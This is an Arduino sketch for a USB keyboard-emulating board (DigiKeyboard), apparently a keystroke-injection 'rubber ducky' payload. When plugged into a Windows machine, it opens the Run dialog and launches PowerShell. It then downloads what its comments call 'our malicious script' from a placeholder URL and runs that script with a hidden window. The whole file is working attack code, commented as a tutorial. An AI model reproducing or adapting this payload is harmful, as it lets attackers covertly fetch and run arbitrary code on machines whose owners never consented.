// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

void setup() {
  // we don't need to initialize anything in this example so the setup()  function remains empty
}

void loop() {
  // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
  DigiKeyboard.sendKeyStroke(0);

  // waits half a second (500 ms) before sending any other key strokes
  DigiKeyboard.delay(500);

  // presses <WINDOWS> + R to open run.exe and waits another half second for it to start
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // writes "powershell" in the textbox of run.exe and presses ENTER to open it
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // now we are on PowerShell, so the code declares a WebClient object to download our malicious script
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // downloads the script from "scriptURL" as "script.ps1"
  DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
  DigiKeyboard.delay(1000);

  // opens a new run.exe instance
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(750);

  // runs the downloaded script in hidden mode
  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    // empty infinite loop
  }
}